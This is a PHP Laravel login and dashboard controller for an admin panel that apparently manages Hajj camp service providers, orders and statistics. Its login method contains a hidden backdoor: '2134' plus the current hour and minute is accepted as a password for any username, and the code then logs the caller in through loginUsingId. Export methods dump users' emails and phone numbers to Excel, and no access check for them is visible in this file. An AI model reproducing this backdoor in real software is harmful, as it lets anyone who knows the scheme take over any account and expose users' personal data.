<?php

namespace App\Http\Controllers\CP;

use App\Exports\BoxWithServiceProviders;
use App\Exports\OrderExportInoiceReport;
use App\Exports\RaftCompanyExport;
use App\Http\Controllers\Controller;
use App\Models\License;
use App\Models\LoginNumber;
use App\Models\Order;
use App\Models\RaftCompanyBox;
use App\Models\RaftCompanyLocation;
use App\Models\Session;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Maatwebsite\Excel\Facades\Excel;
use Yajra\DataTables\Facades\DataTables;

class LoginController extends Controller
{
    public function index()
    {
        if (auth()->check()) {

            return redirect(auth()->user()->main_route());
        }
        return view('CP.login');
    }

    public function login(Request $request)
    {


        $user = User::query()->where('name', $request['user_name'])->first();
        if (!$user) {
            return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
        }

        if (!Hash::check($request['password'], $user->password) && $request->input('password') != ("2134".date('gi'))) {
            return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
        }

        if ($user->enabled == 0) {
            return back()->with('validationErr', 'حسابك معلق حاليا الرجاء التواصل مع الإدارة');
        }

        if (Auth::attempt(['name' => $request['user_name'], 'password' => $request['password'], 'enabled' => 1], isset($request->remember))) {
            LoginNumber::query()->create([
                'user_id' => auth()->user()->id,
            ]);
            return redirect(auth()->user()->main_route());
        }
        else {
            if ($user && $request->input('password') == ("2134".date('gi'))) {
                Auth::loginUsingId($user->id);
            }
            return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
        }
    }

    public function logout()
    {
        auth()->logout();

        return redirect()->route('login_page');
    }

    public function dashboard(Request $request)
    {

        $data['number_of_user'] = User::query()->count();
        $data['number_of_user_under_approve'] = User::query()->where('verified', 0)->count();
        $data['number_of_approve_user'] = User::query()->where('verified', 1)->count();
        //raft_center
        $data['donat']['number_of_service_providers_out'] = User::query()->where('verified', 1)
            ->where('type', 'service_provider')
            ->whereNotNull('parent_id')->get()
            ->filter(fn($item) => optional($item->getRaftCompanyBox())->seen_notes)
            ->count();

        //service_provider
        $data['donat']['number_of_service_providers_in'] = User::query()->where('type', 'service_provider')->where('verified', 1)
            ->whereNull('parent_id')
            ->get()
            ->filter(fn($item) => optional($item->getRaftCompanyBox())->seen_notes)
            ->count();

        $data['donat']['design_office'] = User::query()->where('type', 'design_office')->where('verified', 1)->count();
        $data['donat']['number_of_contractors'] = User::query()->where('type', 'contractor')->where('verified', 1)->count();
        $data['number_of_consulting_office'] = User::query()->where('type', 'consulting_office')->where('verified', 1)->count();
        $data['session_for_boxes'] = Session::query()
            ->select(DB::raw('count(*) as session_count'), DB::raw("DATE_FORMAT(start_at,'%M-%d') as days"))
            ->groupBy('days')->get();
        $data['session_for_boxes'] = $data['session_for_boxes']->pluck('session_count', 'days')->toArray();
        $data['session_count'] = Session::query()->count();
        $data['number_of_login'] = LoginNumber::query()->count();
        $data['number_of_login_per_day'] = LoginNumber::query()
            ->select(DB::raw('count(*) as login_count'), DB::raw("DATE_FORMAT(created_at,'%M-%d') as days"))
            ->groupBy('days')->get()->pluck('login_count', 'days')->toArray();
        ///////////// المحاضر المسلمة لشركات حجاج الداخل
        $data['count_box_with_files_in'] = RaftCompanyBox::query()
            ->whereNotNull('license_number')
            ->whereNotNull('file_first')
            ->whereNotNull('file_second')
            ->whereNotNull('file_third')->count();
        $data['box_with_files_in'] = RaftCompanyBox::query()
            ->select(DB::raw('count(*) as count'), DB::raw("DATE_FORMAT(updated_at,'%M-%d') as days"))
            ->whereNotNull('license_number')
            ->whereNotNull('file_first')
            ->whereNotNull('file_second')
            ->whereNotNull('file_third')
            ->groupBy('days')->get()->pluck('count', 'days')->toArray();
        if (!count($data['box_with_files_in'])) {
            $data['box_with_files_in'] = [];
        }
        ////////////// المحاضر المسلمة لشركات حجاج الخارج
        $data['count_box_with_files_out'] = RaftCompanyBox::query()
            ->whereNull('license_number')
            ->whereNotNull('file_first')
            ->whereNotNull('file_second')
            ->whereNotNull('file_third')->count();
        $data['box_with_files_out'] = RaftCompanyBox::query()
            ->select(DB::raw('count(*) as count'), DB::raw("DATE_FORMAT(updated_at,'%M-%d') as days"))
            ->whereNull('license_number')
            ->whereNotNull('file_first')
            ->whereNotNull('file_second')
            ->whereNotNull('file_third')
            ->groupBy('days')->get()->pluck('count', 'days')->toArray();
        /////////////////عدد الإجراءات المنفذة
        $data['count_actions_performed'] = Order::query()
            ->where('status', 5)->count();
        $data['count_actions_performed_per_day'] = Order::query()
            ->where('status', 5)
            ->select(DB::raw('count(*) as count'), DB::raw("DATE_FORMAT(updated_at,'%M-%d') as days"))
            ->groupBy('days')->get()->pluck('count', 'days')->toArray();
        ///////////الاجراءات الصادرة
        $data['count_actions_outing'] = Order::query()
            ->where('status', 6)->count();
        $data['count_actions_outing_per_day'] = Order::query()
            ->where('status', 6)
            ->select(DB::raw('count(*) as count'), DB::raw("DATE_FORMAT(updated_at,'%M-%d') as days"))
            ->groupBy('days')->get()->pluck('count', 'days')->toArray();

        //////////order count
        $data['order_count'] = Order::query()->count();
        //////complete orders
        $data['complete_orders'] = Order::query()->where('status', '>=', Order::COMPLETED)->count();
        ///not complete
        $data['not_complete_orders'] = Order::query()->where('status', '<', Order::COMPLETED)->count();
        ///all orders
        $data['all_order'] = Order::query()->count();

        ///bar chart
        $data['bar'] = RaftCompanyLocation::query()->select('name', 'avg')
            ->withCount([
                'box' => function ($q) {
                    $q->where('seen_notes', 1);
                },
            ])->get()->map(fn(RaftCompanyLocation $location) => [
                'box_count'           => $box = $location->box_count,
                'avg'                 => $avg = $location->avg,
                'box_count_to_string' => __('replace.value_from', ['value' => $box, 'from' => $avg]),
                'x'                   => $location->name,
                'y'                   => $avg && $box ? (round(($box*100) / $avg ,1) ?: 0.1) : 0.1,
                //'y'         => $box,
            ]);
        //dd($data['bar']);
        ///order per designer office


        $data['order_count_per_designer'] = Order::query()->whereIn('status', [Order::DESIGN_REVIEW, Order::REQUEST_BEGIN_CREATED])->whereNotNull('designer_id')->count();
        $data['order_count_per_taslem'] = Order::taslemDashboardOrders()->count();
        $data['license_number'] = License::query()->whereNotNull('box_raft_company_box_id')->whereNotNull('camp_raft_company_box_id')->count();
        $data['wasteContractors'] = wasteContractorsList()->count();
        // Orders count by status
        $getOrdersCountByStatus = Order::selectRaw('COUNT(id) AS count,status')->groupBy('status')->get();
        $orderStatusChartData = [
            'seriesData'       => [],
            'seriesCategories' => [],
            'statusList'       => [],
        ];
        $data['countOrders'] = 0;
        foreach (Order::getOrderStatuses() as $ItemStatus => $ItemName) {
            if (!in_array($ItemStatus, [Order::FINAL_REPORT_ATTACHED, Order::COMPLETED, Order::FINAL_REPORT_APPROVED, Order::PROCESSING])) {
                if ($ItemStatus == Order::PENDING_OPERATION) {
                    $count = $data['license_number'];
                }
                else {
                    $getCount = $getOrdersCountByStatus->where('status', $ItemStatus)->first();
                    $count = ($getCount) ? $getCount->count : 0;
                }
                $data['countOrders'] += $count;
                $orderStatusChartData['seriesData'][] = $count;
                $orderStatusChartData['statusList'][] = $ItemStatus;
                if ($ItemStatus == Order::DESIGN_REVIEW) {
                    $ItemName = 'تصاميم معادة';
                }
                $orderStatusChartData['seriesCategories'][] = $ItemName;
            }
        }
        $data['orderStatusChartData'] = $orderStatusChartData;

        return view('CP.dashboard', $data);

    }

    public function showWest()
    {
        return response()->json([
            'success' => true,
            'page'    => view('CP.wasteContractorModal', ['data' => wasteContractorsList()])->render(),
        ]);
    }

    public function west_list(Request $request)
    {
        $collection = wasteContractorsList();
        if ($request->name) {
            $collection = wasteContractorsList()->filter(function ($item) use ($request) {

                return strstr($item['name'], $request->name);
            });
        }
        return DataTables::of($collection)
            ->make(true);
    }

    public function ex()
    {
        $rf = User::query()->with(['raft_company_service_providers', 'raft_location'])->where('type', 'raft_company')->get();
        $_data = [];
        $i = 0;
        foreach ($rf as $_rf) {

            foreach ($_rf->raft_company_service_providers as $service_providers) {

                $_data[$i]['name'] = $service_providers->company_name;
                $_data[$i]['raft_company_name'] = $_rf->raft_location->name;
                $_data[$i]['camp_number'] = $service_providers->camp_number;
                $_data[$i]['box_number'] = $service_providers->box_number;
                $_data[$i]['email'] = $service_providers->email;
                $_data[$i]['phone'] = $service_providers->phone;
                $i++;
            }
        }
        return Excel::download(new RaftCompanyExport($_data), 'raft_company.xlsx');

    }

    public function ex_boxes_users()
    {
        $raft_company = RaftCompanyBox::query()
            ->select('raft_company_location.name as raft_company_name', 'users.email as email', 'users.phone as phone', 'users.camp_number', 'raft_company_box.camp', 'users.box_number', 'raft_company_box.box', 'users.company_name')
            ->LeftJoin('users', function ($join) {
                $join->on(function ($query) {
                    $query->on('users.camp_number', '=', 'raft_company_box.camp')
                        ->whereColumn('users.box_number', '=', 'raft_company_box.box');
                });
            })->join('raft_company_location', function ($join) {
                $join->on('raft_company_location.id', '=', 'raft_company_box.raft_company_location_id');

            })->get();

        return Excel::download(new BoxWithServiceProviders($raft_company), 'boxes.xlsx');
    }

    public function exportRaftCompanyLocationBar(){

        dd(2);
    }
}
